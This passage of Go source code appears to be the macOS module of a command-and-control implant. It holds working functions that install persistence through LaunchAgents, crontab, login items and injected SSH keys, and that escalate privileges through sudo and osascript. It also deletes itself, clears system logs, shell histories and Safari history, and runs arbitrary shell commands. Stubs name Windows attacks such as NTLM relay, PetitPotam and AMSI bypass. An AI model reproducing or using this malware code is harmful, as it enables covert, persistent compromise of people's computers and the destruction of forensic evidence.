	// Use osascript to simulate keystrokes on macOS
	if payload == "" {
		return "", fmt.Errorf("remote_input: no payload provided")
	}

	// Escape the payload for AppleScript
	escaped := strings.ReplaceAll(payload, "\"", "\\\"")
	escaped = strings.ReplaceAll(escaped, "\n", "\\n")
	script := fmt.Sprintf(
		`tell application "System Events"
			keystroke "%s"
		end tell`, escaped)

	if out, err := exec.Command("osascript", "-e", script).CombinedOutput(); err == nil {
		return fmt.Sprintf("remote_input: sent via osascript keystroke: %s", payload), nil
	} else {
		// Try with clipboard as fallback
		script2 := fmt.Sprintf(
			`tell application "System Events"
				set the clipboard to "%s"
				keystroke "v" using command down
			end tell`, escaped)
		if out2, err := exec.Command("osascript", "-e", script2).CombinedOutput(); err == nil {
			return fmt.Sprintf("remote_input: sent via osascript paste: %s", payload), nil
		} else {
			return "", fmt.Errorf("remote_input: osascript failed: %v\n%s", err, string(out)+string(out2))
		}
	}
}

func applyPersistence(method string, args string) string {
	method = strings.ToLower(strings.TrimSpace(method))
	switch method {
	case "launchagent", "launchd", "plist":
		if err := addPersistenceDarwin(); err != nil {
			return "persistence: " + err.Error()
		}
		return "persistence: LaunchAgent plist installed"
	case "cron", "crontab":
		exe, _ := os.Executable()
		absExe, _ := filepath.Abs(exe)
		cronLine := fmt.Sprintf("@reboot %s\n", absExe)
		existing, _ := exec.Command("crontab", "-l").Output()
		if !strings.Contains(string(existing), absExe) {
			newCron := string(existing)
			if newCron != "" && !strings.HasSuffix(newCron, "\n") {
				newCron += "\n"
			}
			newCron += cronLine
			cmd := exec.Command("crontab", "-")
			cmd.Stdin = strings.NewReader(newCron)
			if err := cmd.Run(); err != nil {
				return fmt.Sprintf("persistence: crontab install failed: %v", err)
			}
			return "persistence: crontab @reboot entry added"
		}
		return "persistence: crontab entry already exists"
	case "ssh", "ssh_authorized_keys":
		home := os.Getenv("HOME")
		if home == "" {
			return "persistence: HOME not set"
		}
		sshDir := filepath.Join(home, ".ssh")
		os.MkdirAll(sshDir, 0700)
		if args != "" {
			authFile := filepath.Join(sshDir, "authorized_keys")
			existing, _ := os.ReadFile(authFile)
			if !strings.Contains(string(existing), args) {
				f, _ := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
				if f != nil {
					f.WriteString("\n" + args + "\n")
					f.Close()
					return "persistence: SSH authorized_key added"
				}
			}
		}
		return "persistence: SSH authorized_keys requires a public key as args"
	case "loginitem", "loginitems":
		exe, _ := os.Executable()
		absExe, _ := filepath.Abs(exe)
		// Use osascript to add login item
		script := fmt.Sprintf(`tell application "System Events" to make login item at end with properties {path:"%s", hidden:false}`, absExe)
		if out, err := exec.Command("osascript", "-e", script).CombinedOutput(); err != nil {
			return fmt.Sprintf("persistence: login item failed: %v\n%s", err, string(out))
		}
		return "persistence: login item added"
	default:
		if err := addPersistenceDarwin(); err != nil {
			return fmt.Sprintf("persistence: unknown method '%s': %s", method, err.Error())
		}
		return fmt.Sprintf("persistence: unknown method '%s', installed LaunchAgent", method)
	}
}

func listPersistence() string {
	var sb strings.Builder
	sb.WriteString("=== macOS Persistence Mechanisms ===\n")
	home := os.Getenv("HOME")

	// LaunchAgents
	sb.WriteString("\n--- LaunchAgents ---\n")
	launchAgentDirs := []string{
		filepath.Join(home, "Library", "LaunchAgents"),
		"/Library/LaunchAgents",
		"/Library/LaunchDaemons",
	}
	for _, dir := range launchAgentDirs {
		if entries, err := os.ReadDir(dir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".plist") {
					plistPath := filepath.Join(dir, entry.Name())
					if data, _ := os.ReadFile(plistPath); len(data) > 0 {
						sb.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", plistPath, len(data)))
						if strings.Contains(string(data), persistencePrefix) || strings.Contains(string(data), strings.ToLower(persistencePrefix)) {
							sb.WriteString(fmt.Sprintf("    %s\n", string(data)))
						}
					}
				}
			}
		}
	}

	// Cron
	sb.WriteString("\n--- Crontab ---\n")
	if out, err := exec.Command("crontab", "-l").Output(); err == nil {
		sb.WriteString(fmt.Sprintf("%s\n", string(out)))
	} else {
		sb.WriteString("(none)\n")
	}

	// Login Items
	sb.WriteString("\n--- Login Items ---\n")
	script := `tell application "System Events" to get the name of every login item`
	if out, err := exec.Command("osascript", "-e", script).Output(); err == nil {
		sb.WriteString(fmt.Sprintf("Login items: %s\n", strings.TrimSpace(string(out))))
	}

	// SSH authorized_keys
	sb.WriteString("\n--- SSH Authorized Keys ---\n")
	sshDir := filepath.Join(home, ".ssh")
	authFile := filepath.Join(sshDir, "authorized_keys")
	if data, err := os.ReadFile(authFile); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.TrimSpace(line) != "" && !strings.HasPrefix(line, "#") {
				sb.WriteString(fmt.Sprintf("[+] %s\n", line))
			}
		}
	} else {
		sb.WriteString("(not found)\n")
	}

	return sb.String()
}

func removePersistence(method string, args string) string {
	method = strings.ToLower(strings.TrimSpace(method))
	switch method {
	case "launchagent", "launchd", "plist":
		removePersistenceDarwin()
		return "persistence: LaunchAgent removed"
	case "loginitem":
		exe, _ := os.Executable()
		absExe, _ := filepath.Abs(exe)
		script := fmt.Sprintf(`tell application "System Events" to delete login item "%s"`, absExe)
		exec.Command("osascript", "-e", script).Run()
		return "persistence: login item removed"
	case "ssh", "ssh_authorized_keys":
		home := os.Getenv("HOME")
		if home == "" {
			return "persistence: HOME not set"
		}
		authFile := filepath.Join(home, ".ssh", "authorized_keys")
		if args != "" {
			data, _ := os.ReadFile(authFile)
			var newLines []string
			for _, line := range strings.Split(string(data), "\n") {
				if !strings.Contains(line, args) {
					newLines = append(newLines, line)
				}
			}
			os.WriteFile(authFile, []byte(strings.Join(newLines, "\n")), 0600)
			return "persistence: SSH key removed from authorized_keys"
		}
		return "persistence: specify key fragment to remove"
	default:
		removePersistenceDarwin()
		return "persistence: macOS entries removed (LaunchAgent)"
	}
}

func uacBypass(method, payload string) (string, error) {
	if payload == "" {
		payload = "whoami"
	}

	method = strings.ToLower(strings.TrimSpace(method))
	switch method {
	case "sudo", "sudo_nopasswd":
		out, err := runShell(fmt.Sprintf("sudo -n %s", payload), "")
		if err == nil {
			return fmt.Sprintf("uac_bypass: sudo (NOPASSWD) succeeded\n%s", out), nil
		}
		return fmt.Sprintf("uac_bypass: sudo NOPASSWD failed: %v\n%s", err, out), err

	case "osascript", "osa":
		// Use osascript to run a command with admin privileges (may prompt)
		script := fmt.Sprintf(`do shell script "%s" with administrator privileges`, payload)
		out, err := exec.Command("osascript", "-e", script).CombinedOutput()
		if err == nil {
			return fmt.Sprintf("uac_bypass: osascript admin rights succeeded\n%s", string(out)), nil
		}
		return fmt.Sprintf("uac_bypass: osascript admin rights failed (may have prompted for password): %v\n%s", err, string(out)), err

	case "security_auth", "authopen":
		// Use authopen(8) for privilege escalation
		out, err := exec.Command("security", "authorize", "-uew", "system.preferences").CombinedOutput()
		if err != nil {
			return fmt.Sprintf("uac_bypass: security authorize failed: %v\n%s", err, string(out)), err
		}
		return "uac_bypass: security authorization succeeded (privileged operations may be available)", nil

	case "all":
		var sb strings.Builder
		sb.WriteString("=== UAC Bypass Attempts (macOS) ===\n\n")
		sb.WriteString("--- sudo ---\n")
		if out, err := runShell(fmt.Sprintf("sudo -n %s 2>&1", payload), ""); err == nil {
			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", out))
		} else {
			sb.WriteString(fmt.Sprintf("[-] Failed: %v\n", err))
		}
		sb.WriteString("\n--- osascript ---\n")
		if out, err := exec.Command("osascript", "-e", fmt.Sprintf(`do shell script "%s" with administrator privileges`, payload)).CombinedOutput(); err == nil {
			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", string(out)))
		} else {
			sb.WriteString(fmt.Sprintf("[-] Failed: %v\n", err))
		}
		return sb.String(), nil

	default:
		return "", fmt.Errorf("uac_bypass: unknown method '%s' on macOS (supported: sudo, osascript, security_auth, all)", method)
	}
}

func amsiBypass() string        { return "not supported on macOS" }
func amsiSessionBypass() string { return "not supported on macOS" }
func etwBypass() string         { return "not supported on macOS" }
func etwNtTraceEvent() string   { return "not supported on macOS" }
func blockDLLs() string         { return "not supported on macOS" }
func unhookNtdll() string       { return "not supported on macOS" }
func protectProcess() string    { return "not supported on macOS" }

// selfDelete creates a cleanup script that removes the binary and process.
func selfDelete() string {
	script := "#!/bin/sh\nrm -f /proc/$PPID/exe 2>/dev/null\nkill -9 $PPID 2>/dev/null\nrm -f \"$0\""
	tmpFile := "/tmp/.fc_cleanup.sh"
	if err := os.WriteFile(tmpFile, []byte(script), 0755); err != nil {
		return "self-delete: failed to write script: " + err.Error()
	}
	if err := exec.Command("/bin/sh", tmpFile).Start(); err != nil {
		return "self-delete: failed to start cleanup: " + err.Error()
	}
	return "self-delete: cleanup script launched"
}

func executeNetCommand(cmd string) string {
	cmd = strings.ToLower(strings.TrimSpace(cmd))

	switch {
	case cmd == "" || cmd == "help" || cmd == "?":
		return `Available macOS network commands:
  ifconfig       - Show network interfaces
  networksetup   - Show network configuration
  arp            - Show ARP cache
  netstat        - Show network connections
  lsof           - Show listening processes
  dns            - Show DNS config
  hosts          - Show /etc/hosts`

	case cmd == "ifconfig":
		out, _ := runShell("ifconfig 2>/dev/null", "")
		return out

	case cmd == "networksetup" || cmd == "network":
		out, _ := runShell("networksetup -listallnetworkservices 2>/dev/null; networksetup -getinfo 'Wi-Fi' 2>/dev/null; networksetup -getinfo 'Ethernet' 2>/dev/null", "")
		return out

	case cmd == "arp":
		out, _ := runShell("arp -a 2>/dev/null", "")
		return out

	case cmd == "netstat":
		out, _ := runShell("netstat -an -p tcp 2>/dev/null | head -50", "")
		return out

	case cmd == "lsof" || cmd == "listeners":
		out, _ := runShell("lsof -iTCP -sTCP:LISTEN -P -n 2>/dev/null", "")
		return out

	case cmd == "dns" || cmd == "resolv":
		out, _ := runShell("cat /etc/resolv.conf 2>/dev/null; scutil --dns 2>/dev/null", "")
		return out

	case cmd == "hosts":
		data, _ := os.ReadFile("/etc/hosts")
		return string(data)

	default:
		out, err := runShell(cmd, "")
		if err != nil {
			return fmt.Sprintf("net: unknown command: %s (supported: ifconfig, networksetup, arp, netstat, lsof, dns, hosts)", cmd)
		}
		return out
	}
}

func wipeEventLog() string {
	var sb strings.Builder
	// macOS: clear system and app logs
	if out, err := exec.Command("syslog", "-c").Output(); err == nil {
		sb.WriteString(fmt.Sprintf("[+] syslog cleared: %s\n", string(out)))
	} else {
		sb.WriteString("[-] syslog clear failed (may need root)\n")
	}
	// Remove asl log files
	aslFiles, _ := filepath.Glob("/var/log/asl/*.asl")
	for _, f := range aslFiles {
		if err := os.Remove(f); err == nil {
			sb.WriteString(fmt.Sprintf("[+] Removed: %s\n", f))
		}
	}
	if len(aslFiles) == 0 {
		sb.WriteString("[-] No ASL log files found (may need root)\n")
	}
	return sb.String()
}

func wipeTracks() string {
	var sb strings.Builder
	home := os.Getenv("HOME")
	if home == "" {
		return "track_wipe: HOME not set"
	}

	// Clear bash history
	historyFiles := []string{
		filepath.Join(home, ".bash_history"),
		filepath.Join(home, ".zsh_history"),
		filepath.Join(home, ".zhistory"),
		filepath.Join(home, ".sh_history"),
	}
	for _, f := range historyFiles {
		if err := os.Remove(f); err == nil {
			sb.WriteString(fmt.Sprintf("[+] Removed: %s\n", f))
		}
		// Also truncate in-place
		os.WriteFile(f, []byte{}, 0644)
	}

	// Clear recent items via osascript
	script := `tell application "System Events" to delete every item of recent items`
	exec.Command("osascript", "-e", script).Run()
	sb.WriteString("[+] System Events recent items cleared\n")

	// Clear Safari history
	safariHistory := filepath.Join(home, "Library", "Safari", "History.db")
	os.Remove(safariHistory)

	if sb.Len() == 0 {
		return "track_wipe: nothing to clean"
	}
	return sb.String()
}

func selfUpdateWindows(exe, tmpPath string) string { return "" }

func namedPipeImpersonate(cmd string) (string, error) {
	return "", fmt.Errorf("named pipe impersonation is Windows-only")
}

func juicyPotato(cmd string) (string, error) {
	return "", fmt.Errorf("Juicy Potato is Windows-only")
}

func selfUpdateLinux(exe, tmpPath string) string { return "" }

func selfUpdateDarwin(exe, tmpPath string) string {
	shScript := fmt.Sprintf(
		"#!/bin/sh\nsleep 1\ncp -f '%s' '%s'\nchmod +x '%s'\nexec '%s'\n",
		tmpPath, exe, exe, exe)
	tmpScript := exe + ".update.sh"
	if err := os.WriteFile(tmpScript, []byte(shScript), 0755); err != nil {
		return "failed to write update script: " + err.Error()
	}
	cmd := exec.Command("/bin/sh", "-c", "nohup '"+tmpScript+"' >/dev/null 2>&1 &")
	if err := cmd.Start(); err != nil {
		return "failed to start updater: " + err.Error()
	}
	return "self-update: new binary downloaded, replacing and restarting..."
}

func lateralWMI(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralWinRM(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralPsexec(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralDCOM(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralSCF(targetShare string) (string, error) {
	return "", fmt.Errorf("SCF hash capture is Windows-only")
}
func netScanSMB(cidr string) (string, error) {
	return "", fmt.Errorf("SMB scanning is Windows-only")
}
func netEnumHosts(domain string) (string, error) {
	return "", fmt.Errorf("host enumeration is Windows-only")
}
func netScanSMBDiscovery() (string, error) {
	return "", fmt.Errorf("SMB discovery is Windows-only")
}

func dpapiMasterKey() (string, error)           { return "", fmt.Errorf("DPAPI is Windows-only") }
func dpapiBlob(filePath string) (string, error) { return "", fmt.Errorf("DPAPI is Windows-only") }
func dpapiBrowser() (string, error) {
	return "", fmt.Errorf("DPAPI browser decryption is Windows-only")
}
func lsaBypass() (string, error) { return "", fmt.Errorf("LSA bypass is Windows-only") }
func adcsFind() (string, error)  { return "", fmt.Errorf("AD CS enumeration is Windows-only") }
func adcsRequest(template string) (string, error) {
	return "", fmt.Errorf("AD CS certificate request is Windows-only")
}
func shadowCreds(target string) (string, error) {
	return "", fmt.Errorf("Shadow Credentials is Windows-only")
}
func ldapQuery(filter string) (string, error) { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapUsers() (string, error)              { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapGroups() (string, error)             { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapComputers() (string, error)          { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapSPN() (string, error)                { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapACL() (string, error)                { return "", fmt.Errorf("LDAP queries are Windows-only") }

// NTLM relay & coerce stubs
func coercePrinterBug(target, listenAddr string) (string, error) {
	return "", fmt.Errorf("coerce attacks are Windows-only")
}
func coercePetitPotam(target, listenAddr string) (string, error) {
	return "", fmt.Errorf("coerce attacks are Windows-only")
}
func coerceDFSCoerce(target, listenAddr string) (string, error) {
	return "", fmt.Errorf("coerce attacks are Windows-only")
}
func startNTLMRelay(listenAddr, forwardTarget string) (string, error) {
	return "", fmt.Errorf("NTLM relay is Windows-only")
}
func stopNTLMRelay() (string, error) {
	return "", fmt.Errorf("NTLM relay is Windows-only")
}

func initCLRHosting() bool { return false }

func executeAssemblyInProcess(assemblyData []byte, args string) (string, error) {
	return "", fmt.Errorf("CLR execute-assembly is Windows-only")
}

func runPowerShellInProcess(script string) (string, error) {
	return "", fmt.Errorf("CLR PowerShell is Windows-only")
}

func handleCLRExecAssembly(task Task, res *TaskResult) {
	res.Error = "clr_exec_assembly is Windows-only"
}

func handleCLRPowerShell(task Task, res *TaskResult) {
	res.Error = "clr_powershell is Windows-only"
}
